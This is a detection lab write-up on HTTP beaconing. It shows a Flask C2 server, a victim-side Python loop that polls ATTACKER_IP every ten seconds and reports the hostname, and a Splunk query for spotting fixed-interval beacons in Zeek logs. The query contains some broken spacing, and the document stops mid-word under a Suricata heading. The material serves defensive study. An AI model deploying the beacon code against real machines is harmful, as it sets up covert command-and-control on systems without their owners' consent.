# HTTP Beaconing

`HTTP Beaconing` is a Command and Control (C2) technique used to exfiltrate data from a target system after it has been infected (generally through malware). Instead of sending all data at once, it uses "beacons" or small chunks to send data, known as "phoning home," at specific intervals.

## Tools Used for Detection
- `Zeek`


## Attack Simulation

### Step 1: Create a Server on the Attacker Machine

**Python Script** (AI-Generated)

```python

from flask import Flask, request, jsonify
import time

app = Flask(__name__)

@app.route("/checkin", methods=["GET"])
def checkin():
    client = request.args.get("id", "unknown")
    print(f"[+] Check-in from {client}")
    return jsonify({"status": "ok", "sleep": 10})

@app.route("/heartbeat", methods=["GET"])
def heartbeat():
    return "alive", 200

@app.route("/task", methods=["GET"])
def task():
    # No real commands — just simulation
    return jsonify({"cmd": "none"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)

```
![Kali Server](./images/py-server.png)

### Step 2: Automate Beaconing from the Victim

Use a Python script to automate the process of sending requests to the C2 server from the infected machine.

**Python Script** (Hand-Written)

```python

import requests
import time
import socket

C2_SERVER = "http://ATTACKER_IP:8080"
HOSTNAME = socket.gethostname()

HEADERS = {
    "User-Agent": "python-requests/2.28"
}

while True:
    try:
        # first request /first url
        requests.get(
            f"{C2_SERVER}/checkin",
            params={"id": HOSTNAME},
            headers=HEADERS,
            timeout=5
        )

        # second request
        requests.get(
            f"{C2_SERVER}/heartbeat",
            headers=HEADERS,
            timeout=5
        )

        # third request
        requests.get(
            f"{C2_SERVER}/task",
            headers=HEADERS,
            timeout=5
        )

    except Exception as e:
        pass

    time.sleep(10) #fixed interval

```

## Detection

Detection is typically performed by analyzing `Zeek`'s HTTP logs. Since malware communication is often automated, it follows a predictable pattern of requests with fixed intervals (though advanced attackers may use "jitter" to randomize these intervals).

### Detection Points
- **Interval**: Time elapsed between the previous and current request.
- **Jitter**: The difference between the maximum and minimum intervals.
- **Request Count**: Total number of requests over a period.
- **Unique URIs**: A small number of distinct URLs being accessed repeatedly.

### Tools: Zeek, Suricata, Splunk


**Splunk SPL Query:**
```splunk

index="zeek" sourcetype="bro:http:json"
| sort 0 id.orig_h id.resp_h _time
| streamstats current=f last(_time) as prev_time by id.orig_h id. resp_h uri
| eval interval =_ time - prev_time
| where interval > 0
| stats count avg(interval) as avg_interval min(interval) as min_interval max(interval) as max_interval by id.orig_h id.resp_h user_agent uri
| eval jitter = max_interval - min_interval
| where count >20
| where jitter <= 3
| where avg_interval >=8 and avg_interval <= 15
```
![Splunk SPL Visualization](./images/Becon-Spl.png)

**Suricata Rule**
Althugh

